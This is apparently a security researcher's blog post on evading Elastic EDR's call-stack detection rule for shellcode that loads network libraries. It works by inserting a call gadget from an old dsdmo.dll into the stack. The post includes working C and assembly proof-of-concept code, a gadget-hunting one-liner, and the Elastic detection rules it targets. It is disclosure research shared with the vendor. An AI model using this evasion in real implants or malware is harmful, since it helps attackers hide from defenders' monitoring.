# https://offsec.almond.consulting/evading-elastic-callstack-signatures.html

# Evading Elastic EDR's call stack signatures with call gadgets

_Published on_

_Thu 06 November 2025_

_by_
_[SAERXCIT (@SAERXCIT)](https://offsec.almond.consulting/author/saerxcit-saerxcit.html)_

**TL;DR:** Using call gadgets to insert arbitrary modules in the call stack during module load, breaking signatures used in detection rules. The code is available here: [https://github.com/AlmondOffSec/LibTPLoadLib](https://github.com/AlmondOffSec/LibTPLoadLib).

## Introduction

First of all, this research and blog post would not be a thing without Elastic's policy of openness, allowing security researchers to [see how detections work](https://github.com/elastic/protections-artifacts) and [test payloads against them](https://www.elastic.co/security-labs/the-elastic-container-project), so full props and thanks to them! This philosophy is drastically different from how other EDR vendors operate and allows all parties to improve.

The Elastic EDR relies largely on call stacks for its detection logic, providing a strong source of telemetry to base behaviour analysis on. They have released several blog posts introducing and detailing the technique such as [Upping the ante](https://www.elastic.co/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks), [Doubling down](https://www.elastic.co/security-labs/doubling-down-etw-callstacks), and [No more free passes](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware).

A strong indicator for general malicious behaviour is a sensitive operation initiated from _unbacked_ memory, that is, a piece of code not coming from an executable file stored on the filesystem, but instead having been loaded at runtime in dynamically allocated virtual memory. This is the typical behaviour of shellcode. Having the capability to see what the call stack looks like when a sensitive operation happens allows Elastic to detect this kind of suspicious behaviour.

Let's for instance take the use-case of _loading a network module_. That is a step most C2 implants will have to take if they want to communicate with their servers, and as such Elastic developed rules to catch this. For reference, [here is the rule to catch this coming from shellcode in memory](https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml). Ignoring the false positive exclusions, the core of the rule is the following, looking for the presence of unbacked memory within the call stack:

```
[library where\
  dll.name in~ ("ws2_32.dll", "wininet.dll", "winhttp.dll") and\
  process.thread.Ext.call_stack_contains_unbacked == true and\
  (\
   process.thread.Ext.call_stack_summary in\
                  ("ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked",\
                   "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked|kernel32.dll|ntdll.dll",\
                   "ntdll.dll|kernelbase.dll|Unbacked",\
                   "ntdll.dll|iphlpapi.dll|Unbacked",\
                   "ntdll.dll|winhttp.dll|Unbacked",\
                   "ntdll.dll|kernelbase.dll|wininet.dll|Unbacked",\
                   "ntdll.dll|kernelbase.dll|Unbacked|kernel32.dll|ntdll.dll",\
                   "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|Unbacked",\
                   "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|wininet.dll|Unbacked|ntdll.dll",\
                   "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|Unbacked|kernel32.dll|ntdll.dll",\
                   "ntdll.dll|kernelbase.dll|Unbacked|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll") or\
\
  startswith~(process.thread.Ext.call_stack_summary, concat(concat("ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|Unbacked|", process.name), "|kernel32.dll|ntdll.dll"))\
  )\
```\
\
As call stacks happen, obviously, in-process, they are not immune to manipulation to evade existing detection rules. Multiple techniques have been developed throughout the years to hide the fact that a sensitive operation is coming from unbacked memory. We can cite _call stack spoofing_ ( [Dylan Tran's 2023 post](https://dtsec.us/2023-09-15-StackSpoofin/) is a great introduction) and _API proxying_ ( [presented here by Chetan Nayak](https://0xdarkvortex.dev/hiding-in-plainsight/)).\
\
In classic cat-and-mouse fashion, all these techniques introduce their own sets of IoCs, for which Elastic has developed other detection rules. For the same use-case as before, here are some rules aiming to [detect call stack spoofing](https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_library_loaded_from_a_spoofed_call_stack.toml) and [API proxying](https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_library_loaded_via_a_callback_function.toml). Interestingly, all rules only focus on specific sets of libraries, most probably to reduce the false positive rate and performance footprint of the protection agent.\
\
This blog post introduces a technique I thought of and PoC'd to evade Elastic's detections for shellcode loading a network module, in part by exploiting these necessary blind spots. The version tested is the latest at the time of writing: 9.2.0.\
\
Note: as stated, the goal of this post is only to evade a specific detection rule for a specific use-case. As there is more than one way to ~~skin a cat~~ catch shellcode, the EDR will have many more opportunities to detect malicious behaviour throughout the lifetime of the implant, which will have to implement numerous additional evasions not to be detected.\
\
## Observation\
\
Let's run the public technique as-is on an endpoint running the Elastic EDR, and observe what happens and how the rules trigger. The target rule will be the one for API proxying linked above, for which the core (false-positive exclusions removed) is:\
\
```\
sequence by process.entity_id\
 [process where event.action == "start"]\
 [library where\
 (\
   (dll.code_signature.trusted == false or dll.code_signature.exists == false)) or\
\
   dll.name in~ ("vaultcli.dll", "wmiutils.dll", "taskschd.dll", "dnsapi.dll", "dsquery.dll",\
              "mstask.dll", "mstscax.dll", "sqlite3.dll", "clr.dll", "coreclr.dll", "ws2_32.dll",\
              "wininet.dll", "dnsapi.dll", "winhttp.dll", "psapi.dll", "bitsproxy.dll", "softokn3.dll",\
              "System.Management.Automation.dll", "Wldap32.dll")\
 ) and\
\
 process.thread.Ext.call_stack_summary in\
                ("ntdll.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll",\
                 "ntdll.dll|wow64.dll|wow64cpu.dll|wow64.dll|ntdll.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll") and\
```\
\
The focus here is on the call stack signature `"ntdll.dll|kernelbase.dll|ntdll.dll|kernel32.dll|ntdll.dll"`.\
\
I will be running a modified version of the PoC provided by Chetan Nayak in [Hiding in PlainSight part 1](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/), though for our purposes it will behave the same. The goal of the modifications is to allow compilation as a shared library to be used with Raphael Mudge's [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html):\
\
```\
typedef struct _JUMP_LOADLIBRARY1 {\
    LPSTR LibraryName;\
    PVOID pLoadLibraryAddress;\
} JUMP_LOADLIBRARY1, * PJUMP_LOADLIBRARY1;\
\
HMODULE TpLoadLib( CHAR* libName ) {\
\
    PTP_WORK WorkReturn = NULL;\
\
    JUMP_LOADLIBRARY1 Params = { 0 };\
\
    Params.LibraryName = libName;\
    Params.pLoadLibraryAddress = KERNEL32$LoadLibraryA;\
\
    NTDLL$TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, &Params, NULL);\
    NTDLL$TpPostWork(WorkReturn);\
    NTDLL$TpWaitForWork(WorkReturn, FALSE);\
    NTDLL$TpReleaseWork(WorkReturn);\
\
    return KERNEL32$GetModuleHandleA(libName);\
\
}\
```\
\
This is extremely similar to what Daniel Duggan did in [LibTP](https://github.com/rasta-mouse/LibTP), but simplified to only fill the use-case of calling `LoadLibraryA`.\
\
And the associated assembly stub:\
\
```\
void __attribute__((naked)) WorkCallback()\
{\
    __asm__ __volatile__ (\
        ".intel_syntax noprefix;"\
        "mov rcx, [rdx];"       // Put LibraryName into rcx, first agument to LoadLibraryA\
        "mov rax, [rdx + 0x8];" // Prepare jump target (address to LoadLibraryA)\
        "xor rdx, rdx;"         // Null out rdx (second argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)\
        "xor r8, r8;"           // Null out r8 (third argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)\
        "jmp rax;"              // Jmp to LoadLibraryA\
        ".att_syntax prefix;"\
    );\
}\
```\
\
We'll make a very simple COFF calling this function (code below) and link it using Crystal Palace and a slightly modified version of the [Simple PIC spec file](https://tradecraftgarden.org/simplepic.html), merging in the `TpLoadLib` shared library.\
\
```\
#include "../src/tploadlib.h"\
\
WINBASEAPI int WINAPI MSVCRT$printf (const char *, ...);\
WINBASEAPI int WINAPI MSVCRT$getchar (void);\
\
void go() {\
    char* libName = "wininet";\
    MSVCRT$printf("%s: 0x%p\nPress Enter to exit...\n", libName, TpLoadLib(libName));\
    MSVCRT$getchar();\
}\
```\
\
Load it using any basic shellcode loader (you'll need a slight delay in your loader to avoid Elastic's emulation analysis). As expected, the detection triggers and our process is killed:\
\
![Running the public PoC, alert generated](https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback1_1_run.png)\
\
Running this in a debugger, when breaking on the correct call of `NtMapViewOfSection` (the syscall that will end up generating the kernel telemetry Elastic uses for this detection), we can see what the call stack looks like:\
\
![Call stack matching the detection rule](https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback1_2_callstack.png)\
\
This call stack is pretty self-explanatory:\
\
- NTDLL into Kernel32 for the normal thread initialisation routine;\
\
- into the thread's entry point: NTDLL's Thread Pool functions (as this technique is using the Thread Pool API);\
\
- into our registered callback: `LoadLibraryA` in KernelBase;\
\
- into NTDLL's internal implementation of `LdrLoadDll`.\
\
\
Walking the modules in reverse, we find the exact signature that Elastic looks for, explaining the detection. Stepping over the `syscall` instruction, the alert will trigger:\
\
![Detection in debugger](https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback1_3_debugger.png)\
\
## Reflection\
\
This is a smart rule to catch loading a DLL using a callback function. Generic enough to probably not be limited to the Thread Pool APIs, while not having too many false positive exclusions. How could we avoid having this flagged signature in the call stack? As said previously, using a different callback API could lead to the same signature, as the rule does not rely on Thread Pool functions specifically.\
\
Another solution would be to insert a different module somewhere in the call stack. That would theoretically work, as the signature would be broken.\
\
Going back to the basics, an entry is added to the call stack when a `call` assembly instruction is executed by the CPU. This instruction pushes the address of instruction after the `call` on the stack (the _return address_), and jumps to the address pointed by the `call`. The call stack is simply a list of these return addresses, with the position of each of these addresses in the stack computed using the module's unwind info located in its `.pdata` section.\
\
So logically, if we manage to find a controllable `call` instruction in a different module and jump to it, an address within that module will be stored in the call stack, breaking the flagged signature. We also need a `ret` instruction not too far from the `call`, to take back control of the execution and not let RIP wander off, most probably ending in a crash.\
\
We now need to find a module containing such a sequence. Since we need to find the gadget in a module other than KernelBase and NTDLL (as the call stack signature would be the same), we will have to load it at runtime. This is a bit of a chicken-and-egg problem: in order to load a DLL without triggering a detection, we first need to load a DLL. However, as we saw before in the code of the rule, this detection only happens on a specific set of modules (or one with an invalid signature).\
\
This means we just need to find this sequence in a module that does not match these checks. I'm not an exploit guy, I don't know anything about ROP, so I'll find gadgets the way I know: a loop of `objdump | grep`. I'll grab a dump of all System32 DLLs on my local Windows 11 25H2 install, and run this one-liner:\
\
```\
for i in *.dll; do echo $i:; x86_64-w64-mingw32-objdump -d $i -M intel | grep -Ei 'call +r' -A 5 | grep -Ei 'ret' -B5; echo; done | tee call_gadgets.txt\
```\
\
Simply put, it disassembles DLLs and looks for a `call` to a register with a `ret` within the next 5 instructions. I am limiting the search to 5 instructions to reduce the number of false positives: instructions between `call` and `ret` having potentially uncontrollable side effects. These include for instance other `call` instructions (usually to check stack cookies).\
\
After manually analysing the results to filter out the false positives that will have still shown up in the output, we end up with a few candidates. For the sake of this blog post, I will be using version `10.0.26100.1882` of `dsdmo.dll`, which had a gadget that was stable across Windows versions, until it disappeared in version `10.0.26100.3323`. This file can be downloaded from the great [Winbindex](https://winbindex.m417z.com/?file=dsdmo.dll).\
\
The output of the one-liner for this module will be:\
\
```\
dsdmo_10.0.14393.0.dll:\
   18000133d:   41 ff d2                call   r10\
   180001340:   33 c0                   xor    eax,eax\
   180001342:   48 83 c4 28             add    rsp,0x28\
   180001346:   c3                      ret\
\
dsdmo_10.0.26100.1882.dll:\
   18000133d:   41 ff d2                call   r10\
   180001340:   33 c0                   xor    eax,eax\
   180001342:   48 83 c4 28             add    rsp,0x28\
   180001346:   c3                      ret\
\
dsdmo_10.0.26100.3323.dll:\
```\
\
This is a pretty clean gadget: calls a register, then frees the stack space allocated by the function. Since we will be `jmp`ing in the middle of the function, we will need to counteract this by allocating ourselves the freed stack space.\
\
Now at this point, after having identified a candidate, a good step to take is to grep its name over all detection rules, to make sure it's not already used for some other shenanigans.\
\
## Action\
\
Let's modify the original code to use the gadget. Since this PoC is using an old version of the module, I will be placing it on the test machine at the root of the `C:` drive, as `C:\dsdmo_10.0.26100.1882.dll`. The new code is:\
\
```\
typedef struct _JUMP_LOADLIBRARY2 {\
    LPSTR LibraryName;\
    PVOID pLoadLibraryAddress;\
    PVOID pGadgetAddress;\
} JUMP_LOADLIBRARY2, * PJUMP_LOADLIBRARY2;\
\
PVOID GetCallGadgetAddress(\
    PVOID pModule\
) {\
\
    PBYTE pDsdmo = (PBYTE)(pModule);\
    DWORD i = { 0 };\
\
    for (i = 0x1001; i < (0x1000 + 0x25000); i++) {\
        if (pDsdmo[i] == 0x41           &&  // call r10\
            pDsdmo[i + 1] == 0xFF       &&  // call r10\
            pDsdmo[i + 2] == 0xD2       &&  // call r10\
            pDsdmo[i + 8] == 0x28       &&  // add rsp,*28*\
            pDsdmo[i + 9] == 0xC3           // *ret*\
            ) {\
            return &(pDsdmo[i]);\
        }\
    }\
\
    return NULL;\
\
}\
\
HMODULE TpLoadLib( CHAR* libName ) {\
\
    PTP_WORK WorkReturn = NULL;\
\
    JUMP_LOADLIBRARY2 Params = { 0 };\
    Params.LibraryName = libName;\
    Params.pLoadLibraryAddress = KERNEL32$LoadLibraryA;\
\
    HMODULE hDsdmo = KERNEL32$LoadLibraryA("C:\\dsdmo_10.0.26100.1882.dll");\
    Params.pGadgetAddress = GetCallGadgetAddress(hDsdmo);\
\
    NTDLL$TpAllocWork(&WorkReturn, (PTP_WORK_CALLBACK)WorkCallback, &Params, NULL);\
    NTDLL$TpPostWork(WorkReturn);\
    NTDLL$TpWaitForWork(WorkReturn, FALSE);\
    NTDLL$TpReleaseWork(WorkReturn);\
\
    return KERNEL32$GetModuleHandleA(libName);\
\
}\
```\
\
The associated assembly stub has also been modified to accommodate the gadget's address passed as a new member of the parameter structure, as well as to allocate the stack space that will be freed by the gadget.\
\
```\
void __attribute__((naked)) WorkCallback()\
{\
    __asm__ __volatile__ (\
        ".intel_syntax noprefix;"\
        "sub rsp, 0x28;"            // Counteract `add rsp, 28` in the gadget's epilogue; done in this function's "prologue"\
        "mov r10, [rdx + 0x8];"     // Put pLoadLibraryAddress into r10; will be called by the gadget\
        "mov r11, [rdx + 0x10];"    // Put pGadgetAddress into r11; will be jumped to\
        "mov rcx, [rdx];"           // Put LibraryName into rcx, first agument to LoadLibraryA\
        "xor rdx, rdx;"             // Null out rdx (second argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)\
        "xor r8, r8;"               // Null out r8 (third argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)\
        "jmp r11;"                  // Jmp to the gadget, will not put this function's address in the call stack\
        ".att_syntax prefix;"\
    );\
}\
```\
\
The visual way to show what will happen is this simplified diagram. As a reminder, every `call` will put an address in the calling module on the call stack, while a `jmp` will not.\
\
![Diagram of the execution flow](https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback2_0_diagram.png)\
\
Let's run it and see! Once again, we'll shellcode-ify and load it in a debugger to observe the call stack:\
\
![Call stack now breaking the detection rule](https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback2_2_callstack.png)\
\
As expected, we can see `dsdmo_10.0.26100.1882` right between `ntdll` and `kernelbase`, the signature is now broken.\
\
When we run it outside the debugger, no alert is generated, the module is loaded, and the process does not get killed:\
\
![Running the shellcode with no detection](https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback2_1_run.png)\
\
## Conclusion\
\
This technique allows a C2 implant to fill a necessary use-case, loading a network module, without being detected by the Elastic EDR. It builds upon Chetan Nayak's PoC in [Hiding in PlainSight part 1](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/), who himself had expanded it in [Part 2](https://0xdarkvortex.dev/hiding-in-plainsight/) in order to be able to call functions with more than 4 parameters. I have not started looking into whether it's possible to use this technique to call functions with an arbitrary number of parameters, though if it were it would allow evading other rules based on the same logic, such as [Shellcode Fluctuation via CallBack](https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_shellcode_fluctuation_via_callback.toml) and [Windows API via a CallBack Function](https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_windows_api_via_a_callback_function.toml).\
\
Though this blog post uses a gadget found in a previous version of a DLL that is no longer available in the current version of Windows 11, it contains all information needed to find similar usable gadgets in current DLLs. The real challenge is finding a gadget that is stable across Windows versions. As we have seen, even if a gadget is stable for 10 years' worth of updates, it does not mean it cannot change on a random patch Tuesday. [Winbindex](https://winbindex.m417z.com/) is an invaluable help for this, as it allows downloading revisions of the same DLL for all current and past Windows versions.\
\
As I said in the intro, only one use-case is being filled here, the EDR will have many other opportunities to catch the shellcode.\
\
I did give a heads up to Elastic before publishing this post. They have taken this technique into account and are working on updates to the detection rules to catch this.\
\
The full PoC code is available on GitHub: [https://github.com/AlmondOffSec/LibTPLoadLib](https://github.com/AlmondOffSec/LibTPLoadLib)\
\
## Shoutouts\
\
- Once again, Elastic for their policy of openness, and [Joe Desimone](https://x.com/dez_) for the communication on this subject.\
\
- [Raphael Mudge](https://aff-wg.org/) for [Crystal Palace](https://tradecraftgarden.org/crystalpalace.html) and the [Tradecraft Garden](https://tradecraftgarden.org/tradecraft.html).\
\
- [Daniel Duggan](https://x.com/_RastaMouse/) for [LibTP](https://github.com/rasta-mouse/LibTP) and [his exploration of Crystal Palace's capabilities](https://rastamouse.me/).\
\
- [Chetan Nayak](https://x.com/NinjaParanoid/) for Hiding in PlainSight [part 1](https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/) and [part 2](https://0xdarkvortex.dev/hiding-in-plainsight/).\
\
- [Michael Maltsev](https://x.com/m417z) for [Winbindex](https://winbindex.m417z.com/).\
\
- My coworkers, for their proofreading.